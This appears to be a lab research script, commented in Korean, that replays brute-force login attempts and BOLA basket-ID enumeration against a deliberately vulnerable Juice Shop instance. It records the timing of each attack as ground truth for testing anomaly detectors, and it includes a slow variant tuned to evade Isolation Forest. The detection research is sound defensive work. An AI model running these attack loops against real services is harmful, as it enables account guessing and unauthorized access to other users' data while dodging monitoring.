#!/usr/bin/env python3
"""Juice Shop 공격 트래픽 재현기 — 통제된 랩에서 '공격 기간' 로그와 정답지를 자동으로 만든다.  (docs/08 §4, docs/12 §5-3)

4개 사건을 순서대로 실행하고, 각 사건의 시작·끝 시각(UTC)을 answer.csv에 자동 기록한다.
공격 종류 2개 × 사건 2개 — docs/12의 E1(아는 공격)·E2(처음 보는 공격)가 돌아가는 최소 구성.

  A1 brute_fast (.211) : 빠른 로그인 대입 — max_req_1min↑ err_ratio↑, 룰(레이트리밋)도 잡는 대조군
  A2 brute_fast (.212) : 같은 종류 다른 사건 (E1용)
  B1 bola       (.213) : 장바구니 번호 순회 — uniq_objects↑, 응답 200이라 룰은 조용
  B2 bola_slow  (.214) : 느린 BOLA — interval_cv↓, IF는 놓치고 LOF가 잡는지 (H5)

⚠️ 통제된 랩의, 본인 소유 타겟에만. Juice Shop은 의도적 취약 앱이다.
   각 사건은 다른 출발지 IP를 쓴다 → Kali에 보조 IP를 먼저 붙인다:
     sudo nmcli con mod "Wired connection 1" +ipv4.addresses "10.16.1.211/24,10.16.1.212/24,10.16.1.213/24,10.16.1.214/24"
     sudo nmcli con up "Wired connection 1"

사용 (Kali에서):
  python3 tools/gen_attack_traffic.py --base http://10.16.1.10 \
      --src-a1 10.16.1.211 --src-a2 10.16.1.212 --src-b1 10.16.1.213 --src-b2 10.16.1.214 \
      --answer data/answer.csv
  python3 tools/gen_attack_traffic.py --base http://10.16.1.10 --only A1 --speed 4   # 한 사건만, 빠르게(확인용)

끝나면 정상 로그(gen_normal_traffic.py)와 공격 로그를 각각 scp로 분석 PC에 가져가,
정상+공격을 합쳐 features.py → models.py/supervised.py로 돌린다.
"""
import argparse
import csv
import http.client
import json
import os
import random
import sys
import time
from datetime import datetime, timezone
from urllib.parse import urlsplit

PASSWORD = "NormalUser!2026"  # 정상 생성기가 만든 계정과 같은 비밀번호 (로그인용)


def utcnow():
    return datetime.now(timezone.utc)


def iso(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


class Client:
    """출발지 IP 고정 HTTP 클라이언트. 사건 하나가 쓴다."""

    def __init__(self, base, source):
        u = urlsplit(base)
        self.host, self.port = u.hostname, u.port or 80
        self.source = source
        self.base = base.rstrip("/")
        self.token = None
        self.conn = None

    def _connect(self):
        self.conn = http.client.HTTPConnection(self.host, self.port, timeout=20,
                                               source_address=(self.source, 0) if self.source else None)

    def req(self, method, path, body=None):
        headers = {"User-Agent": "lab-attack/1.0", "Accept": "application/json"}
        if self.token:
            headers["Authorization"] = "Bearer " + self.token
        data = json.dumps(body).encode() if body is not None else None
        if data is not None:
            headers["Content-Type"] = "application/json"
        for attempt in (1, 2):
            try:
                if self.conn is None:
                    self._connect()
                self.conn.request(method, path, body=data, headers=headers)
                resp = self.conn.getresponse()
                raw = resp.read()
                try:
                    return resp.status, json.loads(raw)
                except ValueError:
                    return resp.status, raw
            except (OSError, http.client.HTTPException):
                self.conn = None
                if attempt == 2:
                    return 0, None

    def login(self, email):
        """계정이 없으면 만들고 로그인해 토큰을 얻는다 (BOLA 사건이 정상 사용자로 로그인하는 용도)."""
        cred = {"email": email, "password": PASSWORD}
        st, res = self.req("POST", "/rest/user/login", cred)
        if st == 401:
            self.req("POST", "/api/Users", {**cred, "passwordRepeat": PASSWORD})
            st, res = self.req("POST", "/rest/user/login", cred)
        if st == 200 and isinstance(res, dict):
            self.token = res.get("authentication", {}).get("token")
        return self.token is not None


def brute_fast(c, args, rng):
    """A1·A2: 빠른 로그인 대입. 존재하지 않는 비밀번호로 수백 번 → 대부분 401."""
    users = ["admin@juice-sh.op", "root@lab.test", "test@lab.test", "oracle@lab.test", "mc@lab.test"]
    n = args.brute_count
    for i in range(n):
        c.req("POST", "/rest/user/login",
              {"email": rng.choice(users), "password": f"wrong{rng.randint(1000,9999)}"})
        time.sleep(args.brute_gap / args.speed)  # 기본 0.2초 → 1분에 ~300회
    return n


def bola(c, args, rng, slow):
    """B1·B2: 로그인 후 장바구니 번호를 순회. 응답 200이라 룰은 조용, uniq_objects만 튄다."""
    c.login(f"bola{c.source.split('.')[-1]}@lab.test")
    ids = list(range(1, args.bola_range + 1))
    rng.shuffle(ids)
    gap = (args.bola_slow_gap if slow else args.bola_gap) / args.speed
    for bid in ids:
        c.req("GET", f"/rest/basket/{bid}")              # 남의 장바구니 열람
        c.req("GET", f"/api/BasketItems/{bid}")          # 그 안의 항목까지
        time.sleep(gap)
    return len(ids)


SCENARIOS = {
    "A1": ("brute_fast", "src_a1", brute_fast, False),
    "A2": ("brute_fast", "src_a2", brute_fast, False),
    "B1": ("bola",       "src_b1", bola,       False),
    "B2": ("bola",       "src_b2", bola,       True),   # 느린 BOLA. type은 bola로 같게(E2는 종류 기준)
}


def main():
    ap = argparse.ArgumentParser(description="Juice Shop 공격 트래픽 재현기 (랩 전용)")
    ap.add_argument("--base", required=True, help="타겟 nginx 주소, 예: http://10.16.1.10")
    ap.add_argument("--src-a1", default="10.16.1.211")
    ap.add_argument("--src-a2", default="10.16.1.212")
    ap.add_argument("--src-b1", default="10.16.1.213")
    ap.add_argument("--src-b2", default="10.16.1.214")
    ap.add_argument("--only", nargs="*", choices=list(SCENARIOS), help="일부 사건만 (기본: 전부)")
    ap.add_argument("--gap-between", type=float, default=70, help="사건 사이 대기(초) — 5분 구간 분리")
    ap.add_argument("--brute-count", type=int, default=300, help="대입 시도 횟수")
    ap.add_argument("--brute-gap", type=float, default=0.2, help="대입 간격(초)")
    ap.add_argument("--bola-range", type=int, default=40, help="순회할 장바구니 번호 수")
    ap.add_argument("--bola-gap", type=float, default=0.3, help="빠른 BOLA 간격(초)")
    ap.add_argument("--bola-slow-gap", type=float, default=25, help="느린 BOLA 간격(초) — IF 회피")
    ap.add_argument("--speed", type=float, default=1.0, help="간격 배속 (확인용, 실험엔 1)")
    ap.add_argument("--seed", type=int, default=None)
    ap.add_argument("--answer", default="data/answer.csv", help="정답지 출력 CSV")
    args = ap.parse_args()

    if args.speed != 1.0:
        print(f"⚠️ --speed {args.speed}: 간격이 실제보다 빠르다. 실험용 로그엔 쓰지 말 것", file=sys.stderr)
    rng = random.Random(args.seed)
    order = args.only or list(SCENARIOS)
    os.makedirs(os.path.dirname(os.path.abspath(args.answer)), exist_ok=True)
    new_file = not os.path.exists(args.answer) or os.path.getsize(args.answer) == 0
    rows = []

    print(f"공격 재현 시작 (타겟 {args.base}, 사건 {order})  현재 UTC {iso(utcnow())}")
    for aid in order:
        typ, src_key, fn, slow = SCENARIOS[aid]
        src = getattr(args, src_key)
        c = Client(args.base, src)
        # 닿는지 먼저 확인 — 보조 IP가 안 붙었으면 여기서 멈춘다
        st, _ = c.req("GET", "/")
        if st == 0:
            sys.exit(f"[{aid}] {src}에서 타겟에 못 닿음 — 보조 IP가 붙었는지 확인 "
                     f"(ip -4 addr show | grep {src})")
        start = utcnow()
        print(f"[{aid}] {typ:<10} src={src}  시작 {iso(start)} ...", flush=True)
        count = fn(c, args, rng, slow) if fn is bola else fn(c, args, rng)
        end = utcnow()
        print(f"[{aid}] 끝 {iso(end)}  요청 묶음 {count}개  ({(end-start).total_seconds():.0f}초)", flush=True)
        rows.append([aid, src, iso(start), iso(end), typ])
        if aid != order[-1]:
            time.sleep(args.gap_between / args.speed)

    with open(args.answer, "a", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        if new_file:
            w.writerow(["attack_id", "src", "start", "end", "type"])
        w.writerows(rows)
    print(f"\n정답지 기록: {args.answer}")
    for r in rows:
        print("  " + ",".join(r))
    print("\n다음: 공격 로그를 분석 PC로 가져가 정상 로그와 합쳐 분석\n"
          "  scp <타겟>:/var/log/nginx/juiceshop_access.log data/attack_access.log")


if __name__ == "__main__":
    main()
